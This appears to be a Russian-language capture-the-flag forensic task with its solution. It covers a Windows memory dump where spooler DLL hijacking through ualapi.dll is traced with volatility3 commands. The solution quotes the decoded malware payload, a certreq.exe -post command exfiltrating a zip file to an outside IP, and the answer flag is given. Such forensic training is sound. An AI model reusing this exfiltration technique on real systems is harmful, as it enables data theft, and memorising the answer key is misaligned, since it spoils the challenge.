# Forensic | Hard | French Connection

## Информация
Мы наконец достали ПК того бедолаги, через который произошла утечка в прошлом месяце. Но особенно это ничего не поменяло, мы до сих пор не можем собрать все воедино (в плане, мы до сих пор не знаем, что именно утекло). Можешь глянуть и понять, что эти парни у нас украли? Правда мы уже все потерли и отдали комп обратно, есть только дамп памяти.

URLS:
[MEGA](https://mega.nz/file/1k00yLjZ#_dDJrBjQKUUVJjXoNYlxrTWjW4QDkk2hPCLJKHZBl_w)

[Google Drive](https://drive.google.com/file/d/1uQeHiBb6iqYzVYWZWn97Gk73oyWq8-eg/view)
По частям, собирать: cat dump/x* | gunzip -c > 80808

[Yandex Disk](https://disk.yandex.ru/d/_Ea3K-lyhvIzPA)

(Флаг - название файла без расширения. Пример: flag_here.zip -> CUP{flag_here})
MD5 80808.gz: bf241bac7afc054cbbd589c0d97bb7d3
MD5 80808:    1ad79326b2e2161301b45eaa2de3fb12

[Torrent Magnet](magnet:?xt=urn:btih:a8e44518427be0836cb36e99da9dce5df3c3a237&dn=80808.gz&tr=http%3a%2f%2ftracker.openbittorrent.com%3a80%2fannounce)

## Деплой
-

## Выдать участникам
public/80808.gz.torrent

## Описание
Таск на разбор дампа памяти win8.1, где через процесс спулера был проведен dll-hijacking. Задача: найти вредоносный dll, извлечь из него название сгружаемого файла.

## Решение
Решение при помощи volatility3:

1. Исследуем дамп:
	* Получаем дерево процессов: 	python3 vol.py -f 80808 windows.pstree
		!шедулер запускает powershell
		!из под сервиса спулера запущен rundll32

	* Получаем команды:				python3 vol.py -f 80808 windows.cmdline
		!powershell перезапускает сервис спулера

	* Получаем коннекты:			python3 vol.py -f 80808 windows.netscan
		!SYN_SENT на адрес 192.80.11.30:3390

	* Делаем малфайнд:			python3 vol.py -f 80808 windows.malfind
		!rundll32

2. Проверяем dll spoolsv:			python3 vol.py -f 80808 windows.dlllist --pid 1992

3. Получаем образы dll из памяти:	python3 vol.py -f 80808 windows.filescan
									python3 vol.py -f 80808 windows.dumpfiles --physaddr <адреса dll>

4. Понять, какой из dll вредоносный:
	* Оценить соразмерность с оригиналом
	* Посмотреть содержимое вручную
	* Найти адрес (0d3e c0500b1e) grepом по образам
		!ualapi.dll вредоносный

5. Найти в ualapi.dll второй пейлоад в base64, раздекодить:
		!certreq.exe -post -config https://192.80.11.30:80/ c:/users/admin/desktop/utils/c51129468a59c5acba0f0ef6f3b463a0c6ee2e81c6fc9511438fb4930dd0fd.zip

## Флаг

`CUP{c51129468a59c5acba0f0ef6f3b463a0c6ee2e81c6fc9511438fb4930dd0fd}`


